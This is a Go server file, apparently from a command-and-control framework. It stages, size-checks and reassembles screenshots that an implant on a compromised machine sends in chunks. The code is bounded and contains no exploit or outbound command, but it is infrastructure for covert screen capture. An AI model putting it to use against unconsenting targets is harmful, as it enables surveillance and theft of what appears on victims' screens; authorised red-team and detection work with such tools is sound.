package server

import (
	"fmt"
	"time"
)

const (
	// The implant slices a screenshot into 256 KiB chunks. Bound the count and
	// aggregate size so a compromised agent cannot turn the staging map into an
	// unbounded allocation: 256 chunks is 64 MiB at the implant's chunk size.
	maxScreenshotChunkCount = 256
	maxScreenshotChunkBytes = 4 << 20
	maxScreenshotTotalBytes = 64 << 20
	screenshotChunkTTL      = 5 * time.Minute
)

// screenshotChunkBuffer holds the chunks of one capture until its final
// `screenshot_chunked` result arrives. Parts are indexed by the chunk's Offset
// (the implant's chunk index), so duplicate/out-of-order delivery is safe.
type screenshotChunkBuffer struct {
	agentID  string
	total    int
	parts    [][]byte
	received int
	size     int
	updated  time.Time
}

// stageScreenshotChunk records one chunk for a capture task. It never touches
// the task row: the task stays running until the final result proves the whole
// image arrived.
func (s *Server) stageScreenshotChunk(agentID string, taskID uint, index, total int, data []byte) error {
	if taskID == 0 {
		return fmt.Errorf("screenshot chunk has no task id")
	}
	if total < 1 || total > maxScreenshotChunkCount {
		return fmt.Errorf("screenshot chunk count %d out of range", total)
	}
	if index < 0 || index >= total {
		return fmt.Errorf("screenshot chunk index %d out of range 0..%d", index, total-1)
	}
	if len(data) == 0 || len(data) > maxScreenshotChunkBytes {
		return fmt.Errorf("screenshot chunk size %d out of range", len(data))
	}

	s.screenshotChunkMu.Lock()
	defer s.screenshotChunkMu.Unlock()
	if s.screenshotChunks == nil {
		s.screenshotChunks = make(map[uint]*screenshotChunkBuffer)
	}
	now := time.Now()
	for id, stale := range s.screenshotChunks {
		if now.Sub(stale.updated) > screenshotChunkTTL {
			delete(s.screenshotChunks, id)
		}
	}
	buf := s.screenshotChunks[taskID]
	if buf == nil {
		buf = &screenshotChunkBuffer{
			agentID: agentID,
			total:   total,
			parts:   make([][]byte, total),
		}
		s.screenshotChunks[taskID] = buf
	}
	if buf.agentID != agentID {
		return fmt.Errorf("screenshot chunk belongs to another agent")
	}
	if buf.total != total {
		return fmt.Errorf("screenshot chunk count changed from %d to %d", buf.total, total)
	}
	if buf.parts[index] != nil {
		// A retried chunk is expected after a lost result; keep the first copy
		// and do not count it twice.
		return nil
	}
	if buf.size+len(data) > maxScreenshotTotalBytes {
		delete(s.screenshotChunks, taskID)
		return fmt.Errorf("screenshot exceeds the %d byte assembly cap", maxScreenshotTotalBytes)
	}
	buf.parts[index] = data
	buf.received++
	buf.size += len(data)
	buf.updated = now
	return nil
}

// takeAssembledScreenshot returns the concatenated image once every chunk is
// present and removes the staging entry. The caller decides the task result.
func (s *Server) takeAssembledScreenshot(taskID uint) ([]byte, bool) {
	s.screenshotChunkMu.Lock()
	defer s.screenshotChunkMu.Unlock()
	buf := s.screenshotChunks[taskID]
	if buf == nil || buf.received != buf.total {
		return nil, false
	}
	image := make([]byte, 0, buf.size)
	for _, part := range buf.parts {
		if part == nil {
			return nil, false
		}
		image = append(image, part...)
	}
	delete(s.screenshotChunks, taskID)
	return image, true
}

func (s *Server) dropScreenshotChunks(taskID uint) {
	s.screenshotChunkMu.Lock()
	delete(s.screenshotChunks, taskID)
	s.screenshotChunkMu.Unlock()
}
